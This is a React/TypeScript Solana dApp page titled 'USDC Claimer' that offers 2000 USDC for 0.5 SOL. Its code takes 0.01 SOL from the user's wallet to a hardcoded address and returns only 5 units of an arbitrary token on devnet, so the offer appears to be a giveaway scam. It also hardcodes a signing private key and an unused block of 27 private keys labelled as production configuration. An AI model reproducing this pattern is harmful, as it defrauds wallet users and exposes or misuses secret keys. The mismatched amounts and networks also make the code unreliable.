/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "33cUXqrEwfNzMpo5dCMgHYKNgURoNkvY3tHiJQoe3zRUNB6pfBZp8J7cZmWnDrwWuADiprABzXjNccznM2SDyApq"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "5RMYBj3iPG2b3JTtDbkcgx9m4v42naspPjqTnbT3qdpb57LARsRcyyG3bMwZQVW2yXaGLdsD2Bsbx4echgqPCzkR",
  "key1": "5zpQF7fRT9hxub791Nhq8597PWgDpRorqRbvQECmuCUNa4CHSbivvkmAwn9GmvkpEVZtQK4wjdZv9unUokfc2cUV",
  "key2": "5WxqWGfA2QN2WsMEzgCUvuNSNxTGMr5rz8VgchPbXP7HRGSgpEpxbw2fFaaM7NsHx6s5d52XWHKL6fUdtmLY1o8j",
  "key3": "2nSCcNdToLQBcZV8YMBmypdNQGxxcVdkUonWn2pndK1f6wg6BKa2YG3Fe5U5jZYmfTNEpW7kvLZCignzv7RhwJEP",
  "key4": "2mwGNdkGiNvzRrLrhUhWYWri4j1LF56QTZespRph4xShN2r6UthhtdLrUfLxgpAQYmvLY7uj6N3h5AT8jziNXB8P",
  "key5": "65PVkRkTuxDu5dVWX5c8aRx6fgsXAKpiZ3WaFpprnKMtrng8T6J8v8PW13gAnpqFqKQDnfWpwJW3TGy4FxDYBMV1",
  "key6": "cTBCbEmkA8cgVpM7ue7no6gseA9ZWAU44bgtXKZCgjNTRrkvF1EiibyHGv23KrPNR9Zodk8zTUY2r55xsdGhWZU",
  "key7": "58zkiLDbvfkD3SfByDNCDGPBJuKTv1JANhwosDKyHvEaAJuYTbdiZ6wJ3rr7tyRakbr111Xd74A4WqFWZqWxQk4f",
  "key8": "27jZrUS6tathJ3wa3D6KKXAo2NTd3K1u78chwRc2G8X7uK2zXJe9F2uTuweyGKCukCAGxsgK8Yzbhp7fEbN2jevR",
  "key9": "32eWd8WdP2fsz4uTiNuif4DL1gnY95X6qsERoqY4GSL2yjmN8S3e5qGMfuD48qsf13H8t39rfu8FmTSxpagVFRRa",
  "key10": "4ffTJmJoM4QU16RVxXnpuDwwQpTUQaD3dJB1NXLaLmjk1wMhhf1Ad999HVdgL6UUqqmHyQ9DCDMXaAYsYhzBmQnb",
  "key11": "3uoqaRLBctN1JE7RFXFZPn3EAGwPQ6jvfxduCMUj848w3AAqSqiyKFsDRYCaLvurvbCsngVsfRWv2XUJrs6v8Nek",
  "key12": "5RV3SvVy48yaAnToq4m69SAiZVmsrxYMH9MdQR5aXQPRmB7ahvnvRDFbXcXNqJFPqfy9EiocRVChGcyLBMeFPBgn",
  "key13": "u1aP2UMaN3LNQQEEE1ucXXuHpq8kG821arDH32mudTPpDcx9QGJBK3zzBgjVFwdcKYb7coEL6kN2fEe7iLpsSf6",
  "key14": "3wLZfKVqvATho1UnE2VhaJ58soduHmFZUHebQVAGGDPqvgq1QDpjiR6Zct2cKq9e6LqRMu9DmhDDuKj3vR7dCg8y",
  "key15": "5ETuDxaDaYoCNpdoHAt5EehQmmsBpVymmk9kuRc2WKuVjmFp621JrDg2BQz2xHPk3wUVU4MULZye5zwvFT9uB9Zu",
  "key16": "Gh3tEkXgM4sz2Aix2NACCrUaeg69dkughmPcwjRymYKACTp8o1nnNu7D5Z2sMYasXDLLUbps7D1yHcyqLeVJw6M",
  "key17": "3Ra9C3A53PhxKYsq4sY3yvU4qAucYJtMU9H7UJH8ncFerdnRPvAbZ1A7VPcK6JSz8rwMs3mqggXwouSDzwcAYjVz",
  "key18": "43UH4bBkWVRyCZvJM4Cogv2MfMzxYN4qj1NQc3bBwuFQZYjpkbs1LvnTydj9BiS8xYQDrbrdpddKDXCAhoH7K3BD",
  "key19": "4JJr1owxGhij3fiwXEYZR47bMLA3VKtpwQDcaPpLqMH9K4AxfpKXweUUifR5C98HynJ4trykKXADc4aXCMjDPcbA",
  "key20": "5uBTsHDZTtWSZDRwjuJ9Ez2V1i98PG1ZqEEaUFQCW4yM4toqeHXEAixiq3cYQAQRLpfMFpGcxthm9kRVPDn3KJSy",
  "key21": "4XEBa4d7t5aVz6VejfJ3tQFmyxt35R5qrhUuvyWZ6WTxRA9nFQmnS4EXypYYueZ6jAE4khpELtibk8FpiQwdw5RU",
  "key22": "2iQrpmrR5oBfvpDs3pbzKg6u39vn2zvWSL6z3krdmLxiWeTZZMA5pnNuTqEbhViCuZnqRAfmkBzDiLRN51q2VKjd",
  "key23": "MNhWHnPzjKSu2FnU1TNXbfTmumZdXeVhc9DCAoJDA71BHe288ZbPQQimZYnyStTfshNc6YVLAA4a5gQodwSGBvj",
  "key24": "5HWMfdxQmKi9pqztA2CiC9KbG4qagHmmHverdU5gVr6BWQRMTCiJhH9JaRGbNJqPYH5uvsgnhkqFweiTUg4tmAwb",
  "key25": "5W5bZbVpLCsfjuBDSgYguycDrFAEGUa4NDQb5w5b8sDnMYsY88ES99F9HbN7dfaB7hMQXo6pYjPyKVkypzUiNJeY",
  "key26": "4uFxSxUBUBtJijymVqZHG5PRytGdbMuQhejKehPy11g6RuEXavcpDkkq53q5oreU2Zj8euF1Au4Vs2iwdgc8ax1C"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
